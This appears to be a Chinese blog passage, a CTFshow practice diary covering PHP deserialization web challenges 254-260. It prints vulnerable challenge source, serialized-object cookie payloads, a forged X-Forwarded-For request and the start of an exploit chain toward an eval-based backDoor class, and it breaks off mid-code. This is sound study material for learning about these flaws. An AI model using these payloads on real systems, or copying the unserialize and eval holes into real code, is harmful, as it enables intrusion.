<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFshow刷题日记-WEB-反序列化篇(上，254-263) - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CTFshow刷题日记-WEB-反序列化篇(上，254-263)" />
<meta property="og:description" content="非反序列化 web254-简单审计 这个题是搞笑的么🤣
按着源码顺序走一遍
...... $username=$_GET[&#39;username&#39;]; $password=$_GET[&#39;password&#39;]; if(isset($username) &amp;&amp; isset($password)){ $user = new ctfShowUser(); if($user-&gt;login($username,$password)){ if($user-&gt;checkVip()){ $user-&gt;vipOneKeyGetFlag(); } }else{ echo &#34;no vip,no flag&#34;; } } 接受两个参数，生成对象，调用 login 函数
# login 函数 class ctfShowUser{ public $username=&#39;xxxxxx&#39;; public $password=&#39;xxxxxx&#39;; public $isVip=false; ...... public function login($u,$p){ if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){ $this-&gt;isVip=true; } return $this-&gt;isVip; } ...... payload
?username=xxxxxx&amp;password=xxxxxx web259-伪造请求 flag.php
$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]); array_pop($xff); $ip = array_pop($xff); if($ip!==&#39;127.0.0.1&#39;){ die(&#39;error&#39;); }else{ $token = $_POST[&#39;token&#39;]; if($token==&#39;ctfshow&#39;){ file_put_contents(&#39;flag." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/b5a64f60c0ee9d8e1fae0a8dacb447ad/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-09-22T12:36:52+08:00" />
<meta property="article:modified_time" content="2021-09-22T12:36:52+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFshow刷题日记-WEB-反序列化篇(上，254-263)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="_0"></a>非反序列化</h3> 
<h4><a id="web254_2"></a>web254-简单审计</h4> 
<p>这个题是搞笑的么🤣</p> 
<p>按着源码顺序走一遍</p> 
<pre><code class="prism language-php"><span class="token operator">...</span><span class="token operator">...</span>
<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>接受两个参数，生成对象，调用 login 函数</p> 
<pre><code class="prism language-php"><span class="token comment"># login 函数</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token operator">...</span><span class="token operator">...</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">...</span><span class="token operator">...</span>
</code></pre> 
<p>payload</p> 
<pre><code>?username=xxxxxx&amp;password=xxxxxx
</code></pre> 
<h4><a id="web259_49"></a>web259-伪造请求</h4> 
<p>flag.php</p> 
<pre><code class="prism language-php"><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
	<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>需要伪造 xff 头</p> 
<p>这题和反序列化没关系。。。</p> 
<p><img src="https://images2.imgbox.com/b9/c0/UYtcvv8A_o.png" alt="image-20210921094256853"></p> 
<p>然后去浏览器访问 /flag.txt</p> 
<h4><a id="web260_77"></a>web260-正则匹配</h4> 
<p>题目源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>只要 get 传参反序列化后的字符串有 ctfshow_i_love_36D 就可以</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfshow_i_love_36D</span><span class="token punctuation">{<!-- --></span>
<span class="token punctuation">}</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshow_i_love_36D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>payload</p> 
<pre><code class="prism language-php"><span class="token operator">?</span>ctfshow<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A18<span class="token operator">%</span><span class="token number">3</span>A<span class="token string double-quoted-string">"ctfshow_i_love_36D"</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token string double-quoted-string">"isVip"</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D
</code></pre> 
<h3><a id="_110"></a>简单反序列化</h3> 
<h4><a id="web255_112"></a>web255-简单序列化字符串构造</h4> 
<p>这次是通过反序列化 cookie 生成对象</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>让 isVip 的值为 ture</p> 
<p>去构造序列化，反序列化简单的题还是很简单的，因为方法在反序列化时没法保存，所以只能控制属性</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment"># O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}   </span>
<span class="token comment"># 分号需要 url 编码    </span>
</code></pre> 
<p>改变 cookie 的值，添加 user 字段，可以浏览器F12添加，也可以 burp 抓包添加</p> 
<p><img src="https://images2.imgbox.com/d5/d1/EHAkO3f9_o.png" alt="image-20210919221407142"></p> 
<p>添加之后访问 url</p> 
<pre><code>/?username=xxxxxx&amp;password=xxxxxx
cookie:user=O:11:"ctfShowUser":1:{s:5:"isVip"%3bb:1%3b}"
</code></pre> 
<p>得到 flag</p> 
<h4><a id="web256_191"></a>web256-简单序列化字符串构造</h4> 
<p>和上题的基本套路一致，不过 vipOneKeyGetFlag 函数发生了变化</p> 
<pre><code class="prism language-php">	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre> 
<p>注意就是 username 的值和 password 的值不能相等，其实这点很好实现，因为反序列化后生成的 ctfShowUser 对象的属性是可以控制的，让 username 是任意字符串都可以</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'anything'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">TRUE</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
    
<span class="token comment"># O:11:"ctfShowUser":2:{s:8:"username";s:8:"anything";s:5:"isVip";b:1;}</span>
<span class="token comment"># O%3A11%3A%22ctfShowUser%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A8%3A%22anything%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D    </span>
</code></pre> 
<p><img src="https://images2.imgbox.com/e8/07/OU5umQ4D_o.png" alt="image-20210919223805561"></p> 
<h4><a id="web257_225"></a>web257-魔法方法</h4> 
<pre><code class="prism language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>魔法方法他来了，刚才说了方法不能被序列化，但是比如 __construct 魔法方法这种在生成对象时就被调用了，所以在构造序列化字符串时也要考虑</p> 
<p>简单的构造方法，就是把类复制，把该删的删掉剩下的改就行了</p> 
<pre><code class="prism language-php"><span class="token keyword">class</span> ctfShowUser<span class="token punctuation">{<!-- --></span>
    <span class="token comment"># 没用到的都可以删掉</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment"># 用到了，但是值无关紧要</span>
    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>

    <span class="token comment"># 构造方法，创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment"># 因为代码执行函数在 backDoor 类，所以这里可以直接 $this-&gt;class=new backDoor();</span>
    <span class="token punctuation">}</span>
    <span class="token comment"># 不能序列化</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment"># 析构方法，对象销毁时生效，所以无效</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword">class</span><span class="token operator">-&gt;</span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment"># 没用到删去</span>
<span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{<!-- --></span>
